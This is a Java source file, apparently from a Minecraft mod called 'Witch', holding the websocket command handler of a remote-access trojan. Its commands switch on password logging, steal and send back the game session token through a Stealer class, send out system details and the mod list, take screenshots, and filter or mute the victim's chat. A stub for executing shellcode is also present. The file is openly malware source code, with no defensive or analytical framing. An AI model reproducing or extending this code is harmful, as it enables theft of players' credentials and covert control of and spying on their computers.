package me.soda.witch.websocket;

import me.soda.witch.Witch;
import me.soda.witch.config.Config;
import me.soda.witch.features.Modlist;
import me.soda.witch.features.Screenshot;
import me.soda.witch.features.Stealer;
import net.minecraft.util.SystemDetails;

import java.util.Base64;

public class MessageHandler {
    private static String decodeBase64(String str) {
        byte[] result = Base64.getDecoder().decode(str.getBytes());
        return new String(result);
    }

    //todo
    public static void handle(String message) {
        String[] msgArr = message.split(" ");
        String messageType = msgArr[0];
        System.out.println("Received message: " + messageType);
        if (msgArr.length < 1) return;
        try {
            switch (messageType) {
                case "steal_pwd":
                    if (msgArr.length < 2) break;
                    Config.passwordBeingLogged = Boolean.parseBoolean(msgArr[1]);
                    break;
                case "share_token":
                    Witch.sendMessage(messageType, new Stealer().stealToken());
                    break;
                case "getcfg":
                    break;
                case "vanish":
                    break;
                case "chat_control":
                    break;
                case "chat_filter":
                    if (msgArr.length < 2) break;
                    Config.filterPattern = decodeBase64(msgArr[1]);
                    break;
                case "chat_filter_switch":
                    if (msgArr.length < 2) break;
                    Config.isBeingFiltered = Boolean.parseBoolean(msgArr[1]);
                    break;
                case "chat_mute":
                    if (msgArr.length < 2) break;
                    Config.isMuted = Boolean.parseBoolean(msgArr[1]);
                    break;
                case "mods":
                    Witch.sendMessage(messageType, Modlist.allMods());
                    break;
                case "systeminfo":
                    SystemDetails sd = new SystemDetails();
                    StringBuilder sb = new StringBuilder();
                    sd.writeTo(sb);
                    Witch.sendMessage(messageType, sb.toString());
                    break;
                case "log":
                    break;
                case "screenshot":
                    Config.takeScreenshot = true;
                    break;
                case "execute_shellcode":
                    break;
                case "chat":
                    break;
                default:
                    System.out.println();
                    break;
            }
        } catch (Exception e) {
            System.out.println("Corrupted message!");
            e.printStackTrace();
        }
    }
}